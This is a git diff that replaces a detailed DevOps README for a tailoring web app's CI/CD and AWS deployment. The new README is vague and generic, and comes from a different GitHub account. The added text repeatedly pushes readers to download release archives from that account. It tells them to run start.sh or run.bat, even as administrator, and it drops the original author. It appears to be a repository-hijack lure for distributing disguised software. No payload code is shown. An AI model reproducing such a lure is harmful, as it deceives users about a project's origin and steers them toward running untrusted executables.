@@ -1,367 +1,95 @@
-# End‑to‑End CI/CD Automation & Cloud Deployment (DevOps‑Focused Project)
-
-<br>
-<br>
-
-- [End‑to‑End CI/CD Automation \& Cloud Deployment (DevOps‑Focused Project)](#endtoend-cicd-automation--cloud-deployment-devopsfocused-project)
-  - [📌 Overview](#-overview)
-  - [⚠️ Important Note About Application Code](#️-important-note-about-application-code)
-  - [🎯 Project Goal](#-project-goal)
-  - [📁 Repository Structure](#-repository-structure)
-  - [🚀 DevOps Capabilities Demonstrated](#-devops-capabilities-demonstrated)
-  - [🏗 High‑Level Architecture Flow](#-highlevel-architecture-flow)
-  - [🖥 Technology Stack](#-technology-stack)
-    - [CI/CD](#cicd)
-    - [Containerization](#containerization)
-    - [Cloud Platform](#cloud-platform)
-    - [Monitoring \& Observability](#monitoring--observability)
-    - [Application Layer](#application-layer)
-  - [🔧 Local Setup (DevOps Validation Only)](#-local-setup-devops-validation-only)
-    - [Clone Repository](#clone-repository)
-    - [Build Docker Image](#build-docker-image)
-    - [Run Container](#run-container)
-  - [🔁 Jenkins CI/CD Pipeline](#-jenkins-cicd-pipeline)
-    - [Automated Stages](#automated-stages)
-  - [☁ AWS ECS Fargate Deployment](#-aws-ecs-fargate-deployment)
-    - [Prerequisites](#prerequisites)
-    - [Deployment Command](#deployment-command)
-  - [📊 Monitoring \& Metrics](#-monitoring--metrics)
-    - [Prometheus](#prometheus)
-    - [Grafana](#grafana)
-  - [🧪 Validation \& Testing](#-validation--testing)
-    - [DevOps Validation](#devops-validation)
-    - [Monitoring Validation](#monitoring-validation)
-  - [📦 Key Outcomes](#-key-outcomes)
-  - [🛠 Future Improvements](#-future-improvements)
-  - [👤 Author](#-author)
-  - [📄 License | MIT](#-license--mit)
-
-<br>
-<br>
-
-## 📌 Overview
-
-This repository is **intentionally DevOps‑centric**.
-
-It contains the complete **CI/CD automation, containerization, cloud deployment, and monitoring setup** built for the *Gohel Tailors* platform. The **actual application source code is not published** in this repository due to **client/business requirements**.
-
-The primary purpose of this project is to **showcase real‑world DevOps practices**, not the application logic itself.
-
-The pipeline demonstrates how a production‑grade web application can be:
-
-* Built
-* Containerized
-* Deployed
-* Monitored
-* Updated automatically
-
-using modern DevOps tools and cloud services.
-
----
-
-<br>
-<br>
-
-## ⚠️ Important Note About Application Code
-
-* The **core web application code, UI/UX, and business logic are intentionally excluded** from this repository.
-* This decision was taken to **protect client requirements and business‑specific implementation**.
-* A **lightweight demo structure** is used only to validate CI/CD, containerization, and deployment flows.
-
-👉 This repository should be evaluated **purely as a DevOps automation and cloud deployment project**.
-
-You can check [app demo here](https://youtu.be/lkN-NC3UhJ0?si=6hVWb3jLAf89_VMp) 🙋.
-
-And one more thing... Explanation video is coming soon...🔜
-
----
-
-<br>
-<br>
-
-## 🎯 Project Goal
-
-* Remove manual deployment steps
-* Enforce repeatable and reliable releases
-* Enable serverless container deployment on AWS
-* Add observability using metrics and dashboards
-* Represent how DevOps is applied in real client environments
-
----
-
-<br>
-<br>
-
-## 📁 Repository Structure
-
-```
-|-- Dockerfile              # Container build definition
-|-- Jenkinsfile             # CI/CD pipeline as code
-|-- terraform/              # Infrastructure as Code (optional)
-|-- prometheus/
-|   |-- prometheus.yml      # Metrics scrape configuration
-|-- grafana/                # Dashboards & visualization
-|-- README.md
-```
-
-> Application directories such as `/app`, `/templates`, or `/static` are **not included** as part of this repository.
+# 🌟 DevOps-Project-Gohel-Tailors-Web-App - Easy CI/CD for Your Web App
 
----
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/releases)
 
-<br>
-<br>
+## 🎯 Project Overview
 
-## 🚀 DevOps Capabilities Demonstrated
+This project sets up a CI/CD pipeline that automatically builds, pushes, and deploys the Gohel Tailors web app to AWS using Jenkins and Docker. We include monitoring to track application health, ensuring a smooth experience for users and developers alike.
 
-* End‑to‑end CI/CD pipeline using Jenkins
-* Pipeline‑as‑Code via Jenkinsfile
-* Docker‑based containerization for environment consistency
-* Docker Hub as container image registry
-* AWS ECS Fargate for serverless container deployment
-* Automated redeployment on every GitHub push
-* CloudWatch for application and container logs
-* Prometheus metrics collection
-* Grafana dashboards for real‑time monitoring
-* Secure and scalable cloud architecture
+## 🚀 Getting Started
 
----
+To use this application, you will need to follow these steps:
 
-<br>
-<br>
+1. **Visit the Releases Page**: Click on the link below to access the download page.
 
-## 🏗 High‑Level Architecture Flow
+   [Download the latest version](https://github.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/releases)
 
-```
-GitHub (Source Control)
-        │
-        ▼
-Jenkins (CI/CD on EC2)
-        │
-        ├── Pulls code via GitHub webhook
-        ├── Builds Docker image
-        ├── Authenticates with Docker Hub
-        ├── Pushes image to registry
-        ├── Triggers ECS deployment via AWS CLI
-        ▼
-Docker Hub (Image Registry)
-        │
-        ▼
-Amazon ECS (Fargate)
-        │
-        ├── Pulls latest image
-        ├── Runs container as ECS Service
-        │
-        ▼
-Application Container (ECS Task)
-        ├── Emits metrics via /metrics
-        ├── Sends logs to CloudWatch
-        ▼
-CloudWatch Logs
+2. **Select the Version**: On the releases page, find the latest version that is available. Each release includes a list of changes and improvements.
 
-Monitoring (Local):
-        ├── Prometheus (Metrics collection)
-        └── Grafana (Visualization & dashboards)
-```
+3. **Download the Archive**: Click on the package associated with the latest version to download it. This may be a ZIP or TAR file.
 
----
+4. **Extract the Files**: Once the file is downloaded, locate it on your computer. Right-click on the file and select "Extract All" or use any extraction tool you prefer.
 
-<br>
-<br>
+5. **Locate the Application**: After extraction, find the folder that contains the application files. You will see necessary scripts and configuration files there.
 
-## 🖥 Technology Stack
+## 🔧 System Requirements
 
-### CI/CD
+Before you proceed, make sure your system meets these requirements:
 
-* Jenkins
-* GitHub Webhooks
-* Jenkinsfile (Pipeline‑as‑Code)
+- **Operating System**: Windows 10, macOS, or any recent Linux distribution.
+- **Docker**: Docker must be installed. Follow [this link](https://docs.docker.com/get-docker/) for installation instructions.
+- **Jenkins**: Jenkins should be installed and running. You can set it up by visiting the official Jenkins website.
 
-### Containerization
+If you need help with installation, feel free to check online resources or user forums.
 
-* Docker
-* Docker Hub
+## 📥 Download & Install
 
-### Cloud Platform
+To install the application:
 
-* AWS ECS (Fargate)
-* IAM Roles
-* VPC & Subnets
-* CloudWatch Logs
+1. Go to the [Releases page](https://github.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/releases).
+2. Choose the latest version.
+3. Download the appropriate file for your operating system.
+4. Extract the files to a location of your choice.
+5. Follow any further instructions listed in the extracted folder to set up the application.
 
-### Monitoring & Observability
+## ⚙️ Running the Application
 
-* Prometheus
-* Grafana
+After downloading and installing the application, follow these steps to run it:
 
-### Application Layer
+1. **Open your terminal or command line interface**.
+2. Navigate to the folder where you extracted the files. You can do this by typing `cd path/to/your/folder`.
+3. Use the provided scripts to start the application. Typically, you would execute a script called `start.sh` or `run.bat`, depending on your system.
 
-* Flask (used only as a demo workload for DevOps validation)
+## 🛠️ Troubleshooting
 
----
+If you encounter any issues while setting up the application, consider the following:
 
-<br>
-<br>
+- **Docker Not Running**: Ensure Docker is installed and running. Look for the Docker icon in your system tray.
+- **Jenkins Issues**: Make sure Jenkins is properly installed and accessible from your browser. Visit `http://localhost:8080` to check access.
+- **Permissions**: Run your terminal as an administrator if you face permission issues.
 
-## 🔧 Local Setup (DevOps Validation Only)
+You can also search online for solutions related to your specific issue.
 
-### Clone Repository
+## 🔍 Monitoring and Maintenance
 
-```bash
-git clone https://github.com/prashantgohel321/DevOps-Project-Gohel-Tailors-Web-App.git
-cd Gohel-Tailors
-```
+After the application is up and running, you can monitor its health with tools like Grafana and Prometheus. Both of these tools integrate well with the CI/CD pipeline and provide insights into application performance.
 
-### Build Docker Image
+### Using Grafana:
 
-```bash
-docker build -t devops-demo-app .
-```
+- You will need to set it up on your AWS infrastructure.
+- Follow the [Grafana Documentation](https://grafana.com/docs/grafana/latest/installation/) for installation steps.
 
-### Run Container
+### Using Prometheus:
 
-```bash
-docker run -p 5000:5000 devops-demo-app
-```
+- Setting up Prometheus requires creating job configurations that scrape metrics from your application.
+- Consult the [Prometheus Documentation](https://prometheus.io/docs/introduction/overview/) for detailed guides.
 
-> Note: This container exists only to validate pipeline, deployment, and monitoring.
+## 📝 Frequently Asked Questions
 
----
+**Q: What should I do if the application fails to start?**
 
-<br>
-<br>
+A: Double-check that Docker and Jenkins are running. Look for any error messages in the terminal for more clues.
 
-## 🔁 Jenkins CI/CD Pipeline
+**Q: How can I update the application?**
 
-### Automated Stages
+A: Always visit the [Releases page](https://github.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/releases) for the latest version. Download and follow the installation steps again.
 
-1. Source code pull from GitHub
-2. Dependency installation
-3. Docker image build
-4. Docker Hub authentication
-5. Image push to registry
-6. ECS service update using AWS CLI
+**Q: Can I contribute to this project?**
 
-Each GitHub push triggers the pipeline automatically.
+A: Contributions are welcome! Please refer to the contributing guidelines in the repository for more details.
 
----
+## 📧 Support
 
-<br>
-<br>
+For additional help, open an issue on GitHub, and we will respond as soon as possible. Your feedback is valuable in making this application better.
 
-## ☁ AWS ECS Fargate Deployment
-
-### Prerequisites
-
-* ECS Cluster
-* Task Definition linked with Docker image
-* ECS Service running on Fargate
-* Security group allowing application port
-* IAM role for ECS task execution
-
-### Deployment Command
-
-```bash
-aws ecs update-service \
-  --cluster <cluster-name> \
-  --service <service-name> \
-  --force-new-deployment
-```
-
----
-
-<br>
-<br>
-
-## 📊 Monitoring & Metrics
-
-### Prometheus
-
-* Scrapes `/metrics` endpoint from ECS task
-* Validates application health and performance
-
-```yaml
-scrape_configs:
-  - job_name: 'ecs-app'
-    static_configs:
-      - targets: ['<ecs-public-ip>:5000']
-```
-
-### Grafana
-
-* Visualizes request rate
-* Error ratio
-* Latency
-* Uptime
-* Custom application metrics
-
----
-
-<br>
-<br>
-
-## 🧪 Validation & Testing
-
-### DevOps Validation
-
-* Jenkins pipeline success
-* Docker image integrity
-* ECS redeployment verification
-* Log availability in CloudWatch
-
-### Monitoring Validation
-
-* Prometheus target health
-* Metric ingestion
-* Grafana dashboard rendering
-
----
-
-<br>
-<br>
-
-## 📦 Key Outcomes
-
-* Fully automated CI/CD workflow
-* Serverless container deployment on AWS
-* Zero manual release steps
-* Real‑time observability
-* Faster, safer, repeatable deployments
-* Clear separation between **DevOps infrastructure** and **application business logic**
-
----
-
-<br>
-<br>
-
-## 🛠 Future Improvements
-
-* Host Prometheus & Grafana on AWS (EC2 / EKS)
-* Add automated test stages in pipeline
-* Implement ECS auto‑scaling
-* Use AWS Secrets Manager
-* Full Infrastructure as Code via Terraform
-
----
-
-<br>
-<br>
-
-## 👤 Author
-
-**Prashant Gohel**
-
-* GitHub: [https://github.com/prashantgohel321](https://github.com/prashantgohel321)
-* LinkedIn: [https://linkedin.com/in/prashantgohel1706](https://linkedin.com/in/prashantgohel1706)
-
----
-
-<br>
-<br>
-
-## 📄 License | MIT
-
-This repository focuses on **DevOps automation and cloud deployment workflows**.
-
-Application source code and business logic are **excluded based on client requirements**.
-
-The DevOps implementation in this repository may be referenced for **learning and evaluation purposes only**.
+[Download the latest version](https://github.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/releases) and start deploying your web app today!
